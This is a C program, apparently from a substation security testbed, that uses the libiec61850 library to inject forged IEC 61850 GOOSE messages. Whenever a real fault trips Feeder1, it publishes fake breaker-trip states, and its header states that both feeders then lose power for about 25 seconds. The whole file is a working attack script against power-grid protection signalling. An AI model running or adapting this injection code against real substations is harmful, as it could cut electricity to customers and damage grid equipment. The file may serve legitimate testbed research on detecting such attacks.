/*
 * goose_publisher_PIOC_8534a
 
#####################################################################################################################################################

Malicious behaviour:

Network level: Except the benign behaviours, this malicious program will be also running and publishing 30 GOOSE packets (with 1,4,16,64,256,1000ms HB) mal_Pub_FDR (0100100: open CB2_22KV, CB_FDR2) to physcial process (Simulink) when a short-circuit happens around Feeder1.

Physical process level:If a short circuit happens around Feeder1, (CB_FDR1, CB_FDR2) will be opened for almost 25 seconds. Both Feeder1 and Feeder2 are no longer supplied with any power load for the first 25 seconds.

#####################################################################################################################################################
*/


#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>
#include <unistd.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

//#######Define the attack settings #########//

//The number of packets in one period
#define No_pkts 30 
//The Heartbeat of injecting packets (milliseconds)
#define HB normal 

// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
    int HBnew; // the new HB when st changes
    int CBstval[7] = {0,1,0,0,0,0,0}; //current CBstval
    int PreCBstval[7] = {0,1,0,0,0,0,0}; //previous CBstval
    int FakeTrip[7] = {0,1,0,1,1,0,0}; // Fake trip CBstval
    int idx_TrueTrip = 4;
    int idx_pkt = 1; // the index of the inject packets
    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x3103;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x0c;
	gooseCommParameters.dstAddress[5] = 0x03;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;

	/*
	* Create a new GOOSE publisher instance. As the second parameter the interface
	* name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	* is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	* stack_config.h is used.
	*/ 
	
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
	MmsValue* quality = MmsValue_newBitString(13); // Create bit-string with 13 0s

	if (publisher) {
	    GoosePublisher_setGoCbRef(publisher, "QUTZS_FDRPIOC/LLN0$GO$gcb_1");
	    GoosePublisher_setTimeAllowedToLive(publisher, 1100);    
	    GoosePublisher_setDataSetRef(publisher, "QUTZS_FDRPIOC/LLN0$DS_FDR");
	    GoosePublisher_setGoID(publisher , "gcb_1");
	    GoosePublisher_setConfRev(publisher, 200);

	    while (1) {	    	
	    	LinkedList dataSetValues = LinkedList_create(); 	
	    	FILE *fp;
	    	int i;
	    	
	    	fp=fopen("/home/ray/Desktop/FDR OverCur Prot/TripRecord/TripFromPLC.csv","r");
			for (i=0; i<7; i++) {
		    	fscanf(fp,"%d,", &CBstval[i]);
			}    
	    	fclose(fp);
			
			if (memcmp(PreCBstval,CBstval,sizeof(CBstval)) != 0) {  // Compare the previous values
				GoosePublisher_increaseStNum(publisher); //if CB status changes (current != previous), stNum+1
				memcpy(PreCBstval,CBstval,sizeof(CBstval));
				HBnew = 1; // set the new heartbeat to 1ms
				idx_pkt = 1;
			}    
	    	
	    	if ( (CBstval[idx_TrueTrip-1] != 0) && (idx_pkt <= No_pkts) ) {	// If an actual trip occurs 
				for (i = 0; i <7; i++ ) {
					LinkedList_add(dataSetValues, MmsValue_newBoolean(FakeTrip[i]));
					LinkedList_add(dataSetValues, quality); 
				}
				GoosePublisher_publish(publisher, dataSetValues);
				idx_pkt++;
				if (HBnew < 999) {
					Thread_sleep(HBnew); 
					HBnew = HBnew*4;	// Heartbeat times 4 each loop
				}
				else if (HBnew > 999) {
					Thread_sleep(1000);					
				}
			}
			else 
				Thread_sleep(50);
		    
			LinkedList_destroyStatic(dataSetValues);
		}
		GoosePublisher_destroy(publisher);
	}
	else {
		printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}
    	
}